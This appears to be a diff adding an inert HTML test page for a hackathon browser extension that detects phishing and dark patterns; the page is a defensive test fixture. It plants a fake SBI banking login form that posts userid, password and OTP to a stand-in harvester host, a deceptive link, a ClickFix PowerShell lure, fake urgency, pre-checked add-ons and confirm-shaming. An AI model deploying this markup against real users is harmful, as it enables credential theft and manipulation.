@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SBI YONO Security Verification — TrustLens Dark Patterns Test Lab</title>
+  <style>
+    body { font-family: Segoe UI, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 24px; }
+    .lab-banner { background: #1e293b; border: 2px dashed #38bdf8; padding: 12px 18px; border-radius: 10px; margin-bottom: 20px; font-size: 13px; color: #bae6fd; }
+    .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(340px, 1fr)); gap: 18px; }
+    .card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 18px; position: relative; }
+    .timer { font-size: 24px; font-weight: 800; color: #ef4444; }
+    .scarcity { color: #fbbf24; font-weight: 700; }
+    .btn-accept { background: #10b981; color: #fff; font-size: 20px; font-weight: 800; padding: 16px 32px; border: none; border-radius: 8px; cursor: pointer; }
+    .btn-reject { background: transparent; color: #475569; font-size: 9px; border: none; opacity: 0.35; cursor: pointer; }
+    .shame-btn { background: #334155; color: #cbd5e1; padding: 8px 14px; border-radius: 6px; border: none; cursor: pointer; }
+    .clickfix-box { background: #450a0a; border: 1px solid #ef4444; padding: 12px; border-radius: 8px; margin-top: 10px; }
+  </style>
+</head>
+<body>
+  <div class="lab-banner">
+    🧪 <b>INERT SECURITY TEST PAGE (TrustLens AI Hackathon Demo Lab):</b> This page is completely harmless and submits no data anywhere. It deliberately contains planted malicious DOM signals and Dark Patterns so judges can watch the TrustLens Browser Extension catch them in real time.
+  </div>
+
+  <div class="grid">
+    <!-- 1. Cross-Domain Fake Login Form & Deceptive Anchor -->
+    <div class="card">
+      <h3>1. Cross-Domain Credential Form &amp; Deceptive Link</h3>
+      <p>Verify your banking session before it expires:</p>
+      <form action="http://evil-harvester-collector.xyz/steal.php" method="POST" onsubmit="event.preventDefault(); alert('Inert demo form — blocked!');">
+        <label>Account ID: <input type="text" name="userid" placeholder="Do not type real info" /></label><br/><br/>
+        <label>Password: <input type="password" name="password" placeholder="Inert test field" /></label><br/><br/>
+        <label>6-Digit OTP: <input type="text" name="otp_code" placeholder="000000" /></label><br/><br/>
+        <button type="submit">Verify Account Now</button>
+      </form>
+      <p style="margin-top:12px;">
+        Official Portal Link: <a href="http://sbi-phish-collector.xyz/login">https://www.sbi.co.in</a>
+      </p>
+    </div>
+
+    <!-- 2. Fake Urgency Countdown & Scarcity -->
+    <div class="card">
+      <h3>2. Fake Urgency Countdown &amp; Scarcity</h3>
+      <p>⚠️ Hurry! Offer expires in: <span id="fakeTimer" class="timer" data-countdown="true">04:59</span> (resets on every reload!)</p>
+      <p class="scarcity">🔥 Only 2 left in stock! 47 people viewing now!</p>
+      <p>Hidden fee notice: A mandatory ₹799 processing &amp; convenience fee will be added at the final payment step.</p>
+    </div>
+
+    <!-- 3. Pre-Checked Add-ons, Forced Continuity & Confirm-Shaming -->
+    <div class="card">
+      <h3>3. Pre-Checked Boxes &amp; Confirm-Shaming</h3>
+      <label><input type="checkbox" checked /> Add VIP Fraud Insurance Protection for ₹499/month (auto-renews monthly unless cancelled 30 days prior).</label><br/><br/>
+      <label><input type="checkbox" checked /> Subscribe me to daily partner marketing SMS and promotional calls.</label><br/><br/>
+      <button class="shame-btn" data-confirm-shame="true">No thanks, I don't want to protect my family's savings and prefer paying full price</button>
+    </div>
+
+    <!-- 4. Asymmetric Cookie Banner & Misdirection Close Button -->
+    <div class="card">
+      <h3>4. Asymmetric Choice &amp; Misdirection Close ('X')</h3>
+      <a href="http://ad-tracker-redirect.xyz/promo" class="close-btn" aria-label="Close" style="position:absolute; top:10px; right:14px; color:#f87171; text-decoration:none; font-weight:bold;">✕</a>
+      <p>Accept all tracking cookies and third-party data brokers?</p>
+      <div>
+        <button class="btn-accept">ACCEPT ALL &amp; CONTINUE</button>
+        <button class="btn-reject">Manage / Reject</button>
+      </div>
+    </div>
+
+    <!-- 5. Fake Virus Alert & ClickFix Win+R Prompt -->
+    <div class="card">
+      <h3>5. Fake System Dialog &amp; ClickFix Trap</h3>
+      <div class="clickfix-box">
+        <b>🚨 CRITICAL WINDOWS DEFENDER ALERT: Your PC is infected with 3 Trojans!</b><br/>
+        Call Microsoft Refund &amp; Support Desk immediately at 1800-000-9999.<br/><br/>
+        <b>Human Verification (ClickFix):</b> Press <kbd>Win + R</kbd> on your keyboard, press <kbd>Ctrl + V</kbd> to paste our verification command into powershell, and press Enter.
+      </div>
+    </div>
+  </div>
+
+  <!-- 6. Hidden Cross-Origin Iframe -->
+  <iframe src="https://example.org/hidden-frame" style="width:0px;height:0px;opacity:0;border:0;" title="hidden-test-iframe"></iframe>
+
+  <script>
+    // Inert countdown timer that always resets to 04:59 on reload
+    let sec = 299;
+    setInterval(() => {
+      sec = sec > 0 ? sec - 1 : 299;
+      const m = String(Math.floor(sec / 60)).padStart(2, '0');
+      const s = String(sec % 60).padStart(2, '0');
+      const el = document.getElementById('fakeTimer');
+      if (el) el.textContent = m + ':' + s;
+    }, 1000);
+  </script>
+</body>
+</html>
